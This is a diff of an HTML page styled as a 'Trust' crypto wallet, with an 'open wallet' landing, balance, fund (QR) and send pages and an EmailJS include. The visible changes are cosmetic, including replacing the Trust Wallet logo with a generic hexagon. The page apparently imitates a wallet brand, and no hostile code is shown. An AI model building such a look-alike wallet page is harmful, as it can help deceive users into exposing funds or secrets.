@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Trust • clean glass & balance flip</title>
+  <title>Trust • hexagon & clean landing</title>
   <!-- EmailJS (unchanged) -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
@@ -20,7 +20,7 @@
       background-image: url('https://ipblockchain.github.io/photo/images%20(2).jpeg');
       background-repeat: no-repeat;
       background-position: center top;
-      background-size: cover;
+      background-size: auto;        /* changed to auto */
       background-attachment: fixed;
       display: flex;
       align-items: center;
@@ -109,27 +109,39 @@
       display: flex;
     }
 
-    /* ----- LANDING ----- */
+    /* ----- LANDING (blue hexagon only) ----- */
     .landing {
       align-items: center;
-      gap: 22px;
-      padding: 8px 0 6px;
-    }
-    .trust-image {
-      width: 100%;
-      display: flex;
       justify-content: center;
-      margin: 5px 0;
+      gap: 32px;
+      padding: 30px 0 30px;
+      min-height: 320px;
     }
-    .trust-image img {
-      width: 160px;
-      border-radius: 30px;
-      box-shadow: 0 10px 22px -8px rgba(0,30,70,0.3);
+    /* blue hexagon */
+    .hexagon-logo {
+      width: 110px;
+      height: 120px;
+      background: #1e88e5;  /* vibrant blue */
+      clip-path: polygon(25% 0%, 75% 0%, 100% 25%, 100% 75%, 75% 100%, 25% 100%, 0% 75%, 0% 25%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 2rem;
+      font-weight: 600;
+      box-shadow: 0 15px 25px -8px #0d3b6b;
+      margin-bottom: 10px;
+    }
+    /* optional inner letter, or just blank — we put a small diamond or keep minimal */
+    .hexagon-logo span {
+      opacity: 0.9;
+      font-size: 2.2rem;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
     }
     .open-btn {
       background: #1e2a3a;
       border: none;
-      padding: 14px 36px;
+      padding: 16px 40px;
       border-radius: 60px;
       font-size: 1.5rem;
       font-weight: 500;
@@ -139,15 +151,19 @@
       justify-content: center;
       gap: 8px;
       cursor: pointer;
-      box-shadow: 0 10px 20px -8px #0f1a2b;
+      box-shadow: 0 12px 24px -8px #0f1f33;
       width: auto;
-      min-width: 200px;
+      min-width: 220px;
       border: 1px solid #3f556f;
+      text-transform: lowercase;
+    }
+    .open-btn::first-letter {
+      text-transform: uppercase;
     }
     .light-footer {
       font-size: 0.7rem;
       background: #eef3fa;
-      padding: 4px 16px;
+      padding: 6px 20px;
       border-radius: 40px;
       color: #2d4a70;
     }
@@ -183,7 +199,7 @@
       margin-top: 4px;
     }
 
-    /* clean glass-style action circles: just text inside */
+    /* glass circles with SEND / FUND */
     .action-row {
       display: flex;
       justify-content: center;
@@ -301,7 +317,7 @@
       margin-top: 12px;
     }
 
-    /* ----- LOADING PAGE (spinner infinite) ----- */
+    /* loading */
     .loading-page {
       align-items: center;
       justify-content: center;
@@ -318,7 +334,7 @@
     }
     @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
 
-    /* ----- FUND PAGE (QR) ----- */
+    /* fund page */
     .fund-page {
       gap: 20px;
       align-items: center;
@@ -386,7 +402,7 @@
       text-align: center;
     }
 
-    /* ----- SEND PAGE ----- */
+    /* send page */
     .send-page {
       gap: 20px;
     }
@@ -527,16 +543,16 @@
   <div class="laser-beam" aria-hidden="true"></div>
 
   <div class="card">
-    <!-- LANDING PAGE -->
+    <!-- LANDING PAGE: blue hexagon + open wallet -->
     <div class="page landing active" id="landingPage">
-      <div class="trust-image">
-        <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" alt="trust">
+      <div class="hexagon-logo">
+        <span>⧫</span>   <!-- small elegant symbol, or could be blank, just blue shape */
       </div>
-      <button class="open-btn" id="openWalletBtn">⏺ open wallet</button>
+      <button class="open-btn" id="openWalletBtn">open wallet</button>
       <div class="light-footer">secure gateway</div>
     </div>
 
-    <!-- MAIN WALLET PAGE (glass circles & balance toggle) -->
+    <!-- MAIN WALLET PAGE -->
     <div class="page wallet-page" id="walletPage">
       <div class="balance-section">
         <div class="total-label">total balance</div>
